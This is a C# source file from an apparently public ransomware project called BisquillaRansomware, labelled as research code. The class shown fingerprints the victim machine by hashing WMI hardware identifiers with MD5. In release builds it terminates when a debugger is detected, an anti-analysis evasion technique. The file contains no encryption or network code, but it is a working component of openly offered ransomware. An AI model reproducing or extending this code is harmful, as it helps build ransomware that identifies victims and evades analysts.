/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace BisquillaRansomware
{
    /// <summary>
    /// Generate Unique Computer ID
    /// </summary>
    public class ComputerIdStrategy
    {
        /// <summary>
        /// Generates a Unique FingerPrint
        /// </summary>
        public static void GenerateFP(ref string id)
        {
#if !DEBUG
            // BEGIN DEBUG DETECTION
            bool isDebuggerPresent = false;
            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent || Debugger.IsAttached)
            {
                Environment.Exit(-1);
            }
            // END DEBUG DETECTION
#endif

            StringBuilder sb = new StringBuilder();

            string[] spec = ConfigurationManager.HARDWARE_INFO.Split('@');

            foreach (string mainSpec in spec)
            {
                string[] innerSpec = mainSpec.Split(';');

                string identifier = GetIdentifier(innerSpec[0], innerSpec[1]);

                sb.AppendLine(identifier);

                Common.ClearString(ref identifier);
            }

            id = GetHash(sb.ToString());
        }

        private static string GetHash(string s)
        {
            MD5 sec = new MD5CryptoServiceProvider();
            ASCIIEncoding enc = new ASCIIEncoding();
            byte[] bt = enc.GetBytes(s);
            return GetHexString(sec.ComputeHash(bt));
        }

        private static string GetHexString(byte[] bt)
        {
            string s = string.Empty;
            for (int i = 0; i < bt.Length; i++)
            {
                byte b = bt[i];
                int n, n1, n2;
                n = (int)b;
                n1 = n & 15;
                n2 = (n >> 4) & 15;
                if (n2 > 9)
                    s += ((char)(n2 - 10 + (int)'A')).ToString();
                else
                    s += n2.ToString();
                if (n1 > 9)
                    s += ((char)(n1 - 10 + (int)'A')).ToString();
                else
                    s += n1.ToString();
                if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
            }
            return s;
        }

        private static string GetIdentifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                        result = "foo";
                    }
                }
            }
            return result;
        }
    }
}
